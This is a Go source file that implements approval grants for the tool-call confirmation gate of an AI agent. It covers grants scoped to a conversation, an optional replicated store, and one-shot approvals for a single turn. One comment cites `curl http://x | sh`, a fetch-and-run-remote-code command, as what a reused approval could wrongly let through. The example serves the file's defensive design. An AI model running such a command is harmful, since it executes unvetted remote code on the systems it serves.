package compute

import (
	"context"
	"sync"
	"sync/atomic"

	"github.com/jmylchreest/lobslaw/internal/turn"
)

// Every confirmation was one-shot: PromptDecision was approved or
// denied and nothing else, so the operator was asked again the next
// time the same tool ran on the same thing. Forever.
//
// That is not a small annoyance. A confirmation someone has already
// answered a dozen times stops being a decision and becomes a reflex,
// and an operator who switches confirmations off to stop the nagging
// has lost the protection entirely. The gate is only worth having if
// it asks about things the answer might actually differ on.
//
// So an approval can also cover the rest of the conversation.
//
// A permanent "always" is deliberately absent rather than added here.
// The policy engine already evaluates (subject, action, resource) and
// already has allow as an effect, so a permanent approval is an allow
// rule — after which this check never fires again, because Evaluate
// returns allow before it reaches require_confirmation. Building a
// second permanent store beside it would mean two things deciding the
// same question, and eventually disagreeing.

// SessionApprovals records "approved for the rest of this
// conversation" grants. Safe for concurrent use.
//
// Keyed by conversation rather than by user: the confirmation was
// shown in a conversation and answered there, and in a group chat the
// person who taps Approve is approving for that chat. Widening it to
// the user across every conversation would grant more than the button
// appeared to offer.
//
// Grants used to live only in this process, and the argument for that
// was real: a grant outliving what the user was looking at is one they
// did not knowingly give. But that argument only ever covered the
// RESTART axis. On the cluster axis it never held — same conversation,
// same continuity the user was reasoning about, and they were asked
// again because the next message landed on a different node. That is
// not the continuity ending; that is routing.
//
// So a durable backing store can be wired in, and the bound the dying
// process used to provide becomes an explicit TTL on the grant. A
// process exiting is a terrible TTL: it made the lifetime of a
// security grant a function of deploy cadence, which is not a decision
// anybody made.
//
// Without a backing store it stays a process-local map, which is what
// a node with no raft gets — the same behaviour as before, confined to
// one process, rather than a silent absence of the feature.
type SessionApprovals struct {
	mu      sync.RWMutex
	granted map[string]struct{}

	// durable is the replicated store, when there is one.
	durable DurableGrants
}

// DurableGrants is the slice of the replicated grant store that
// compute needs. An interface so this package does not import memory —
// and so a test can substitute one without a raft.
type DurableGrants interface {
	Grant(ctx context.Context, sessionID, action, resource, grantedBy string) error
	Granted(sessionID, action, resource string) bool
}

// NewSessionApprovals builds an empty store.
func NewSessionApprovals() *SessionApprovals {
	return &SessionApprovals{granted: make(map[string]struct{})}
}

// SetDurable wires the replicated store. Once set, grants go to raft
// and reads consult it, so an approval given on one node is honoured
// on every other.
//
// The in-process map is kept as well, not replaced. A raft apply can
// fail — a lost leader, a timeout — and the user has already tapped
// the button: falling back to a local grant means the conversation
// they are in the middle of continues, degraded to what it was before
// rather than broken. The failure is logged by the caller.
func (s *SessionApprovals) SetDurable(d DurableGrants) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.durable = d
}

// Grant records an approval for the conversation identified by the
// turn on ctx, and reports whether it recorded one. A turn with no
// identity is refused: an anonymous grant has no conversation to be
// scoped to, and a grant that matches everything is the opposite of
// what the user was offered.
func (s *SessionApprovals) Grant(ctx context.Context, action, resource string) bool {
	key, ok := approvalKey(ctx, action, resource)
	if !ok {
		return false
	}
	s.mu.Lock()
	s.granted[key] = struct{}{}
	durable := s.durable
	s.mu.Unlock()

	if durable != nil {
		id, _ := turn.IdentityFrom(ctx)
		// Best-effort, and the local grant above is why that is
		// acceptable: a failed replication degrades this to the
		// process-local behaviour it had before rather than losing the
		// answer the user already gave. The error is the caller's to
		// report — this returns whether a grant was recorded, and one
		// was.
		_ = durable.Grant(ctx, sessionKeyOf(id), action, resource, id.Principal.String())
	}
	return true
}

// DurableGrantErr records an approval and returns the replication
// error, for callers that want to say something about it.
func (s *SessionApprovals) DurableGrantErr(ctx context.Context, action, resource string) error {
	s.mu.RLock()
	durable := s.durable
	s.mu.RUnlock()
	if durable == nil {
		return nil
	}
	id, ok := turn.IdentityFrom(ctx)
	if !ok {
		return nil
	}
	return durable.Grant(ctx, sessionKeyOf(id), action, resource, id.Principal.String())
}

// sessionKeyOf is the conversation identifier a grant is scoped to.
//
// "<channel>:<channel_id>" — deliberately the same key SessionRecord
// uses, so a conversation's grants can be dropped alongside its
// transcript rather than by a second convention somebody has to
// remember to keep in step.
func sessionKeyOf(id turn.Identity) string {
	if id.Channel == "" || id.ChannelID == "" {
		return ""
	}
	return id.Channel + ":" + id.ChannelID
}

// Granted reports whether this conversation has already approved this
// operation. A nil store grants nothing, so the zero value is the safe
// one and a deployment that never wires a store is not accidentally
// permissive.
func (s *SessionApprovals) Granted(ctx context.Context, action, resource string) bool {
	if s == nil {
		return false
	}
	key, ok := approvalKey(ctx, action, resource)
	if !ok {
		return false
	}
	s.mu.RLock()
	_, found := s.granted[key]
	durable := s.durable
	s.mu.RUnlock()
	if found {
		return true
	}
	// The replicated store is consulted only when the local map misses,
	// which is the case this whole change exists for: the grant was
	// given on another node, or before this process started.
	if durable == nil {
		return false
	}
	id, _ := turn.IdentityFrom(ctx)
	return durable.Granted(sessionKeyOf(id), action, resource)
}

// approvalKey derives the grant key from the turn identity on ctx.
//
// The identity comes from the request context rather than from
// anything the model produced, for the same reason ownership does: a
// key the model could influence would let a prompt injection claim a
// grant belonging to a different conversation.
func approvalKey(ctx context.Context, action, resource string) (string, bool) {
	id, ok := turn.IdentityFrom(ctx)
	if !ok || id.Channel == "" || id.ChannelID == "" {
		return "", false
	}
	// NUL separates the conversation from the operation, so a channel
	// id containing the separator cannot forge a different key.
	return id.Channel + ":" + id.ChannelID + "\x00" + action + "\x00" + resource, true
}

// Approving ONCE has to mean something.
//
// "Approve" resolves the prompt and resumes the turn, and until this
// existed it recorded nothing anywhere — so the resumed turn re-ran the
// same tool call, met the same require_confirmation, and sent another
// keyboard. Tapping Approve produced a new prompt, forever, and the
// only escape was a scope the user had not asked for.
//
// The budget path never hit it because Budget.Relax() carries "this
// turn is authorised" across the resume. Policy had no equivalent, and
// the gap stayed invisible while no default rule asked for confirmation
// — every deployment that met it had written the rule on purpose and
// tapped "for this chat" out of habit.
//
// Turn-scoped rather than conversation-scoped, because the user
// answered a question about one operation in one turn. It rides the
// context, so it expires when the resumed turn's context does; there is
// nothing to store, sweep, or replicate.
type turnApprovalKey struct{}

type turnApproval struct {
	action   string
	resource string
	// used makes the approval ONE-SHOT.
	//
	// Without it an approval covers the operation for the whole
	// remaining turn, which is wrong wherever one resource stands for
	// more than one command: every unclassifiable command shares the
	// resource "!unclassified", so approving `cd /tmp && ls` once would
	// have silently authorised `curl http://x | sh` later in the same
	// turn. The user answered about one call; this answers for one call.
	used atomic.Bool
}

// WithTurnApproval marks one operation as answered for the remainder
// of this turn.
//
// The pair comes from the PROMPT RECORD, written when the turn paused,
// never from the callback that resolved it. A callback is
// attacker-shaped input — the same reason the grant helpers take the
// operation from the pending scope rather than reading it off the tap.
//
// An empty action grants nothing: a budget confirmation carries no
// operation, and "approved everything" is not the reading of a blank.
func WithTurnApproval(ctx context.Context, action, resource string) context.Context {
	if action == "" {
		return ctx
	}
	return context.WithValue(ctx, turnApprovalKey{}, &turnApproval{action: action, resource: resource})
}

// turnApprovalPending reports whether ctx carries an approval that has
// not been spent yet.
//
// Read-only: the resume path uses it to decide whether this is a
// confirmation about a TOOL CALL at all. A budget confirmation carries
// no operation, so it never sets one.
func turnApprovalPending(ctx context.Context) bool {
	a, ok := ctx.Value(turnApprovalKey{}).(*turnApproval)
	return ok && a.action != "" && !a.used.Load()
}

// turnApproved reports whether this turn already answered for exactly
// this operation.
func turnApproved(ctx context.Context, action, resource string) bool {
	a, ok := ctx.Value(turnApprovalKey{}).(*turnApproval)
	if !ok || a.action == "" {
		return false
	}
	if a.action != action || a.resource != resource {
		return false
	}
	// Spent on the first match, so a second call sharing this resource
	// is asked about rather than waved through.
	return a.used.CompareAndSwap(false, true)
}
